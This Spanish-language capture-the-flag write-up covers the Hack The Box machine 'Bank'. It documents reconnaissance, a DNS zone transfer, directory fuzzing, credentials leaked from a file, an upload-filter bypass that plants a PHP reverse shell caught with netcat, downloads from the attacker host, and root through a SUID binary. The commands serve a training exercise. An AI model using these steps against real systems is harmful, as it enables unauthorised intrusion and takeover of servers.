---
layout: single
title: Bank - Hack The Box
excerpt: "Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el ataque de transferencia de zona DNS y veremos acerca del virtual hosting que por lo que he investigado, hay otras máquinas que lo van a ocupar."
date: 2023-02-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-bank/bank_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Apache httpd 2.4.7
  - Domain Zone Transfer Zone Attack (AXFR)
  - Virtual Hosting
  - Fuzzing
  - Information Leakage
  - Remote Command Execution - (RCE)
  - Reverse Shell
  - Local Privilege Escalation - (LPE)
  - LPE - SUID Binary
  - OSCP Style
---
![](/assets/images/htb-writeup-bank/bank_logo.png)
Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el **ataque de transferencia de zona DNS** y veremos acerca del **virtual hosting** que por lo que he investigado, hay otras máquina que lo van a ocupar.

# Recopilación de Información
## Traza ICMP
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veamos que SO opera ahí.
```
ping -c 4 10.10.10.29                                                             
PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
64 bytes from 10.10.10.29: icmp_seq=1 ttl=63 time=132 ms
64 bytes from 10.10.10.29: icmp_seq=2 ttl=63 time=132 ms
64 bytes from 10.10.10.29: icmp_seq=3 ttl=63 time=131 ms
64 bytes from 10.10.10.29: icmp_seq=4 ttl=63 time=134 ms

--- 10.10.10.29 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 130.666/132.167/134.499/1.417 ms
```
Por el TTL, sabemos que es una máquina Linux, hagamos los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.29 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:01 CST
Initiating SYN Stealth Scan at 12:01
Scanning 10.10.10.29 [65535 ports]
Discovered open port 22/tcp on 10.10.10.29
Discovered open port 80/tcp on 10.10.10.29
Discovered open port 53/tcp on 10.10.10.29
Completed SYN Stealth Scan at 12:02, 23.93s elapsed (65535 total ports)
Nmap scan report for 10.10.10.29
Host is up, received user-set (0.44s latency).
Scanned at 2023-02-19 12:01:41 CST for 24s
Not shown: 33062 closed tcp ports (reset), 32470 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
           Raw packets sent: 116367 (5.120MB) | Rcvd: 33677 (1.347MB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Hay tres puertos abiertos, hay 2 servicios que ya conocemos por los puertos, estos son el servicio SSH y el HTTP. Veamos que nos dice el escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p22,53,80 10.10.10.29 -oN targeted                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:04 CST
Nmap scan report for 10.10.10.29
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08eed030d545e459db4d54a8dc5cef15 (DSA)
|   2048 b8e015482d0df0f17333b78164084a91 (RSA)
|   256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA)
|_  256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Vemos lo que opera en los puertos, para empezar como no tenemos credenciales no podemos entrar al servicio SSH así que lo único que podemos hacer es revisar la página web.

![](/assets/images/htb-writeup-bank/Captura1.png)

Pues nos manda la página por defecto de Apache y no nos muestra nada en realidad. Incluso no es necesario ver el **Wappalizer** porque de plano no nos muestra nada que nos pueda ayudar.

¿Entonces que hacemos? Es momento de investigar.

# Análisis de Vulnerabilidades
## Investigación del Puerto 80
Bueno para el caso de esta máquina hay que ser preciso en 2 puntos:

* No es lo mismo poner una IP de un dominio a poner el nombre del dominio, ejemplo, 10.10.10.29 o Ejemplo.com

¿Por qué? Porque quizá el servidor o máquina donde estén operando dichas páginas web tenga activo el **Virtual Hosting**.

¿Y esta madre que es? Bueno:

**El alojamiento compartido o alojamiento virtual, en inglés Virtual hosting, es una de las modalidades más utilizadas por las empresas dedicadas al negocio del alojamiento web. Dependiendo de los recursos disponibles, permite tener una cantidad variable de dominios y sitios web en una misma máquina.​**

Es decir, que puede haber varios dominios en solo una máquina, como en este caso.

¿Qué podemos hacer? Es sencillo, para nuestro caso **HackTheBox** suele tener dominios con el nombre de la máquina seguido de **.htb**. Podremos probar si esto es verdad mandando un ping al dominio **bank.htb**, que deducimos es el nombre de dominio que está ocupando la máquina:

```
ping -c 1 bank.htb   
ping: bank.htb: Nombre o servicio desconocido
```
Ok, pero no nos sale nada, ¿ahora qué? Tan simple como que tengamos que registrar ese dominio en el archivo **hosts** que esta guardado en el directorio **etc**, hagámoslo:
```
locate /etc/hosts    
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
nano /etc/hosts
```
Una vez dentro, vamos a poner la ip de la máquina más el dominio **bank.htb**:
```
10.10.10.29 bank.htb
```
Guardamos, salimos y volvemos a intentar mandar el ping:
```
ping -c 1 bank.htb
PING bank.htb (10.10.10.29) 56(84) bytes of data.
64 bytes from bank.htb (10.10.10.29): icmp_seq=1 ttl=63 time=130 ms

--- bank.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 130.266/130.266/130.266/0.000 ms
```
¡EXCELENTE! Ahora sabemos que ese dominio si existe, por lo que intentemos entrar en el poniendo el nombre del dominio directamente en el buscador.

![](/assets/images/htb-writeup-bank/Captura2.png)

Ahí está, tenemos un login, veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura3.png">
</p>

Tenemos bastante información que nos puede ser útil más adelante. Ahora vamos a utilizar una herramienta bastante útil para estos casos llamada **dig**.

**Dig (Domain Information Groper) es una herramienta de línea de comandos de Linux que realiza búsquedas en los registros DNS, a través de los nombres de servidores, y te muestra el resultado.**

Aqui el link con más información:

* https://www.hostinger.mx/tutoriales/comando-dig-linux

Entonces, utilicemos esta herramienta, hagamos varias pruebas:

* Vamos a especificar los nombres de servidores:
```
dig @10.10.10.29 bank.htb     
; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54337
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; WARNING: recursion requested but not available
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;bank.htb.                      IN      A
;; ANSWER SECTION:
bank.htb.               604800  IN      A       10.10.10.29
;; AUTHORITY SECTION:
bank.htb.               604800  IN      NS      ns.bank.htb.
;; ADDITIONAL SECTION:
ns.bank.htb.            604800  IN      A       10.10.10.29
;; Query time: 131 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (UDP)
;; WHEN: Mon Apr 03 13:12:37 CST 2023
;; MSG SIZE  rcvd: 86
```
* Bien, ahora veamos que correos están registrados en la máquina:
```
dig @10.10.10.29 bank.htb MX  
; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb MX
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61728
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;bank.htb.                      IN      MX
;; AUTHORITY SECTION:
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 135 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (UDP)
;; WHEN: Mon Apr 03 13:17:34 CST 2023
;; MSG SIZE  rcvd: 79
```
Muy bien, tenemos un correo que en este caso puede ser un usuario para que podamos acceder después. Lo que podemos hacer son 2 cosas, la primera un **Fuzzing** para ver que subdominios tiene esta página web y dos, ver si podemos hacer un **ataque de transferencia de zona DNS**.

## Fuzzing
Primero hagamos el **Fuzzing** y luego explico el ataque:
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ/    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000001:   302        188 L    319 W      7322 Ch     "# directory-list-2.3-medium.txt"                                           
000000002:   302        188 L    319 W      7322 Ch     "#"                                                                         
000000011:   302        188 L    319 W      7322 Ch     "# Priority ordered case sensative list, where entries were found"          
000000010:   302        188 L    319 W      7322 Ch     "#"                                                                         
000000008:   302        188 L    319 W      7322 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                
000000007:   302        188 L    319 W      7322 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000004:   302        188 L    319 W      7322 Ch     "#"                                                                         
000000009:   302        188 L    319 W      7322 Ch     "# Suite 300, San Francisco, California, 94105, USA."                       
000000003:   302        188 L    319 W      7322 Ch     "# Copyright 2007 James Fisher"                                             
000000012:   302        188 L    319 W      7322 Ch     "# on atleast 2 different hosts"                                            
000000014:   302        188 L    319 W      7322 Ch     "http://bank.htb//"                                                         
000000006:   302        188 L    319 W      7322 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"             
000000005:   302        188 L    319 W      7322 Ch     "# This work is licensed under the Creative Commons"                        
000000013:   302        188 L    319 W      7322 Ch     "#"                                                                         
000000083:   403        10 L     30 W       281 Ch      "icons"                                                                     
000000291:   200        20 L     104 W      1696 Ch     "assets"                                                                    
000000164:   403        10 L     30 W       283 Ch      "uploads"                                                                   
000002190:   200        19 L     89 W       1530 Ch     "inc"                                                                       
000045240:   302        188 L    319 W      7322 Ch     "http://bank.htb//"                                                         
000095524:   403        10 L     30 W       289 Ch      "server-status"                                                             
000192709:   200        1014 L   11038 W    253503 Ch   "balance-transfer"                                                          

Total time: 585.2624
Processed Requests: 220560
Filtered Requests: 220539
Requests/sec.: 376.8565
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Bien, vemos algunos subdominios que podemos investigar, ahora el ataque.

¿Qué es un **Ataque de Transferencia de Zona DNS**?:

**Una transferencia de zona es un mecanismo para replicar datos de DNS a través de servidores DNS. Es decir si se tienen dos servidores DNS, el primer servidor confía en AXFR para poner los mismos datos en un segundo servidor. AXFR es también utilizado por terceros no autorizados quienes requieran obtener datos más profundos de un sitio.**

Entonces lo que conseguiremos será más información sobre subdominios, algo similar al **Fuzzing** que hicimos, entonces probémoslo: 
```
 dig @10.10.10.29 bank.htb AXFR

; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb AXFR
; (1 server found)
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 131 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Mon Apr 03 13:23:13 CST 2023
;; XFR size: 6 records (messages 1, bytes 171)
```
Pues mucha información no nos dio, así que vamos a analizar los subdominios que obtuvimos del **Fuzzing**.

## Analizando subdominios
Hice dos pruebas de **Fuzzing**, una normal, que es la que está arriba, y la otra poniendo la extension **.php**, en esta última no salió nada relevante, solo quería mencionarlo.

Como vemos, hay algunos subdominios, pero el que más llama la atención es el **balance-transfer**, entremos a ese:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura5.png">
</p>

Changos, hay muchos archivos, pero ¿qué es esa extención **.acc**?, vamos a investigarla:

**Los archivos en el formato ACC son utilizados por el software de Cuentas gráficas como archivos de datos de salida del proyecto que contienen datos introducidos por el autor de los archivos del CAC.**

Quiero entender que aquí se guardan datos que se han utilizado en la página web, como son muchos no quiero ponerme a ver cada uno a menos que lo requiera, entonces lo que haremos será descargar el texto de esta página para buscar si hay alguno diferente.

¿Y esto por qué? Porque hay muchos con el mismo peso, debe haber algunos con menor o mayor peso y eso quiere decir que son únicos.

Para descargar el texto vamos a usar **curl** y expresiones **REGEX** para filtrar, vamos por pasos:

* Descargamos el texto de esta página:
```
curl -s -X GET "http://bank.htb/balance-transfer/"
```
Si lo dejamos así, solo veremos el código HTML por lo que usaremos la herramienta **html2text** para cambiar de HTML a texto:
```
curl -s -X GET "http://bank.htb/balance-transfer/" | html2text
```
Ahora si se ve en texto, pero no quiero que se vean esos corchetes además de que nos molestaran a la hora del filtrado, así que vamos a eliminarlos con **awk**:
```
curl -s -X GET "http://bank.htb/balance-transfer/" | html2text | awk '{print $3 " " $5}' > output.txt
```
Ahora sí, con eso ya solamente quedaría el nombre del archivo y su peso.

* Filtramos por **REGEX** para ver si hay archivos con menor o mayor peso:
```
cat output | sed '/^\s*$/d' |
```
Con **sed** vamos a eliminar los espacios que hay entre cada archivo de arriba a abajo para que solo queden los puros nombres y pesos. Y con grep vamos a ir eliminando los pesos más comunes que vimos a ojo de buen cubero, ósea el 585, 584, 583 y 582:
```
cat output | sed '/^\s*$/d' | grep -v -E "582|583|584|585"
```
* Resultado final:
```
cat output | sed '/^\s*$/d' | grep -v -E "582|583|584|585"
of ******
Last Description
   
09ed7588d1cd47ffca297cc7dac22c52.acc 581
941e55bed0cb8052e7015e7133a5b9c7.acc 581
68576f20e9732f1b2edc4df5b8533230.acc 257
Server bank.htb
```
¡BRAVO! Hay 3 archivos poco comunes pero el que más llama la atención es el que pesa 257, vamos a descargarlo buscándolo en la página y dándole click:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura6.png">
</p>

Lo mandamos al directorio de trabajo y vemos su contenido:
```
cat 68576f20e9732f1b2edc4df5b8533230.acc 
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
Mira nada más, son el usuario y contraseña, bueno ya teníamos el usuario, ahora vamos a probarlos:

![](/assets/images/htb-writeup-bank/Captura7.png)

¡Entramos! Investiguemos que podemos hacer.

![](/assets/images/htb-writeup-bank/Captura8.png)

Veo que podemos subir archivos, pero no dice de que tipo. Quizá si analizamos el código fuente de la página podremos encontrar algo útil, para hacer esto solo oprimimos **ctrl + u**:

![](/assets/images/htb-writeup-bank/Captura9.png)

¡Ahí está! Solamente acepta archivos con terminación **.htb** y dichos archivos deben ser hechos en **PHP**, lo que podemos hacer es cargar un Payload para poder conectarnos de manera remota. Busquemos uno en internet:

Aqui un Payload:
* https://github.com/pentestmonkey/php-reverse-shell

# Explotación de Vulnerabilidadaes
En el link anterior hay un Payload hecho en **PHP** que debemos modificar metiendo nuestra IP y un puerto al que debemos conectarnos, hagámoslo por pasos:

* Descargando Payload:
```
git clone https://github.com/pentestmonkey/php-reverse-shell.git                         
Clonando en 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Recibiendo objetos: 100% (10/10), 9.81 KiB | 837.00 KiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```
* Ahora modificamos el Payload, puedes eliminar lo demás, no es necesario:
```
$VERSION = "1.0";
$ip = 'Tu_IP';  // CHANGE THIS
$port = Puerto_Que_Quieras;       // CHANGE THIS
$chunk_size = 1400;
```
* Bien, vamos a renombrarlo para agregarle la extensión **.htb**:
```
mv php-reverse-shell.php LocalPE.htb
```
* Una vez ya modificado, lo subimos:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura10.png">
</p>

* Levantamos una netcat con el puerto que pusimos en el Payload:
```
nc -nvlp 443                          
listening on [any] 443 ...
```
* Ya cargado en la página el Payload, le damos click en donde lo pide:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura11.png">
</p>

* ¡Y estamos dentro!:
```
nc -nvlp 443                          
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.29] 56838
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 01:46:21 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Ya solo es cosa de buscar la flag del usuario que esta en el directorio **/home**.

# Post Explotación
¿Qué podemos hacer? Lo más fácil seria ver que permisos tenemos, pero antes vamos a sacar un terminal más interactiva:
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bank:/$ ls
ls
bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz
boot  home        lib             mnt    root  srv   usr  vmlinuz.old
dev   initrd.img  lost+found      opt    run   sys   var
```
Ahora si, vamos a ver los permisos:
```
www-data@bank:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Mmmmm no creo que sean muy útiles los permisos, veamos que versión de Linux tiene, aunque el escaneo de servicios ya nos lo dio:
```
www-data@bank:/$ uname -r
uname -r
4.4.0-79-generic
www-data@bank:/$ uname -a
uname -a
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
```
Muy bien, busquemos un Exploit. Buscando un Exploit por internet, encontré este:

* https://www.exploit-db.com/exploits/44298

Bien, busquemoslo con **Searchsploit**:
```
searchsploit Ubuntu 16.04.4  
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                     | linux/local/44298.c
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Analizándolo un poco pues no creo que nos sirva mucho, más que nada no tiene especificaciones sobre cómo usarlo, entonces busquemos otro:
```
searchsploit Linux 4.4.0-79        
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Alienvault Open Source SIEM (OSSIM) < 4.7.0 - 'get_license' Remote Command Execution (Metasploit)          | linux/remote/42697.rb
Alienvault Open Source SIEM (OSSIM) < 4.7.0 - av-centerd 'get_log_line()' Remote Code Execution            | linux/remote/33805.pl
Alienvault Open Source SIEM (OSSIM) < 4.8.0 - 'get_file' Information Disclosure (Metasploit)               | linux/remote/42695.rb
AppArmor securityfs < 4.8 - 'aa_fs_seq_hash_show' Reference Count Leak                                     | linux/dos/40181.c
CyberArk < 10 - Memory Disclosure                                                                          | linux/remote/44829.py
CyberArk Password Vault < 9.7 / < 10 - Memory Disclosure                                                   | linux/dos/44428.txt
Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution                                               | linux/local/44920.txt
Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution                                               | linux/local/44920.txt
Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Execution                                              | linux/remote/44921.txt
Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Execution                                              | linux/remote/44921.txt
Dell EMC RecoverPoint boxmgmt CLI < 5.1.2 - Arbitrary File Read                                            | linux/local/44688.txt
DenyAll WAF < 6.3.0 - Remote Code Execution (Metasploit)                                                   | linux/webapps/42769.rb
Exim < 4.86.2 - Local Privilege Escalation                                                                 | linux/local/39549.txt
Exim < 4.90.1 - 'base64d' Remote Code Execution                                                            | linux/remote/44571.py
Exim4 < 4.69 - string_format Function Heap Buffer Overflow (Metasploit)                                    | linux/remote/16925.rb
Fortinet FortiGate 4.x < 5.0.7 - SSH Backdoor Access                                                       | linux/remote/43386.py
Jfrog Artifactory < 4.16 - Arbitrary File Upload / Remote Command Execution                                | linux/webapps/44543.txt
LibreOffice < 6.0.1 - '=WEBSERVICE' Remote Arbitrary File Disclosure                                       | linux/remote/44022.md
Linux < 4.14.103 / < 4.19.25 - Out-of-Bounds Read and Write in SNMP NAT Module                             | linux/dos/46477.txt
Linux < 4.16.9 / < 4.14.41 - 4-byte Infoleak via Uninitialized Struct Field in compat adjtimex Syscall     | linux/dos/44641.c
Linux < 4.20.14 - Virtual Address 0 is Mappable via Privileged write() to /proc/*/mem                      | linux/dos/46502.txt
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                  | solaris/local/15962.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Rin | linux/local/9479.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                          | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                 | linux/local/41995.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                       | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                 | linux/local/41886.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                               | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                               | linux/local/43345.c
...
```
Son un buen, pero el que me llamo la atención fue este: **Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation**

Vamos a descargarlo y a analizarlo:
```
searchsploit -m linux/local/47169.c

  Exploit: Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)
      URL: https://www.exploit-db.com/exploits/47169
     Path: /usr/share/exploitdb/exploits/linux/local/47169.c
    Codes: CVE-2017-1000112
 Verified: False
File Type: C source, ASCII text
```
Excelente, nos da especificaciones sobre cómo usarlo:
```
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
// user@ubuntu:~$ whoami
// user
// user@ubuntu:~$ id
// uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn
```
Ahora intentemos subirlo, vamos por pasos:
* Primero vamos a abrir un servidor con Python:
```
python3 -m http.server                                                            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Ahora intentemos subirlo:
```
www-data@bank:/$ curl -O http://10.10.14.14:8000/LocalPE.c
curl -O http://10.10.14.14:8000/LocalPE.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to create the file LocalPE.c: Permission denied
  9 28360    9  2656    0     0   9388      0  0:00:03 --:--:--  0:00:03  9418
curl: (23) Failed writing body (0 != 2656)
```
* Chetos no se puede, intentémoslo de otra forma:
```
www-data@bank:/$ wget 10.10.14.14/LocalPE.c
wget 10.10.14.14/LocalPE.c
--2023-04-04 02:11:28--  http://10.10.14.14/LocalPE.c
Connecting to 10.10.14.14:80... failed: Connection refused.
```
Era OBVIO que no teníamos permisos para descargar cosas xd, solamente lo hice para tener un ejemplo de cómo enviar archivos a un SO Linux.

¿Entonces que queda? Investiguemos que archivos tenemos permisos para usar:
```
www-data@bank:/$ find \-perm -4000 2>/dev/null
find \-perm -4000 2>/dev/null
./var/htb/bin/emergency
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/at
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/traceroute6.iputils
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/mtr
./usr/sbin/uuidd
./usr/sbin/pppd
./bin/ping
./bin/ping6
./bin/su
./bin/fusermount
./bin/mount
./bin/umount
```
Tenemos varios como el passwd, sudo y uno que es extraño:
```
www-data@bank:/$ file ./var/htb/bin/emergency
file ./var/htb/bin/emergency
./var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
```
Ok, veamos que permisos tiene: 
```
www-data@bank:/$ ls -la ./var/htb/bin/emergency
ls -la ./var/htb/bin/emergency
-rwsr-xr-x 1 root root 112204 Jun 14  2017 ./var/htb/bin/emergency
```
Mmmm ¿Root? Ósea que, si lo ejecutamos, ¿seremos Root? Hagámoslo:
```
www-data@bank:/$ ./var/htb/bin/emergency
./var/htb/bin/emergency
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
```
a...Bueno, ya quedaron todas las flags.

## Links de Investigación
* https://www.google.com/search?client=firefox-b-e&q=ISC+BIND+9.9.5-3ubuntu0.14 https://neoattack.com/neowiki/dns/
* https://linube.com/ayuda/articulo/267/que-es-un-virtualhost
* https://www.reydes.com/d/?q=Solicitar_una_Transferencia_de_Zona_utilizando_el_Script_dns_zone_transfer_de_Nmap
* https://www.welivesecurity.com/la-es/2015/06/17/trata-ataque-transferencia-zona-dns/
* https://www.hostinger.mx/tutoriales/comando-dig-linux https://www.ecured.cu/Html2text
* https://tecnonautas.net/como-usar-curl-para-descargar-archivos-y-paginas-web/
* https://itsfoss.com/es/descargar-archivos-desde-terminal-linux/ https://atareao.es/tutorial/terminal/filtros-awk-grep-sed-y-cut/
* https://geekland.eu/uso-del-comando-awk-en-linux-y-unix-con-ejemplos/
* https://www.enmimaquinafunciona.com/pregunta/67844/uso-de-sed-para-eliminar-digitos-y-espacios-en-blanco-de-una-cadena
* https://github.com/pentestmonkey/php-reverse-shell https://pentestmonkey.net/tools/web-shells/php-reverse-shell
* https://www.exploit-db.com/exploits/43418 https://openwebinars.net/blog/wget-descargas-desde-linea-de-comandos/
* https://www.enmimaquinafunciona.com/pregunta/75153/inicio-de-sesion-interactivo-y-no-interactivo-shell
* https://esgeeks.com/post-explotacion-transferir-archivos-windows-linux/#http

# FIN
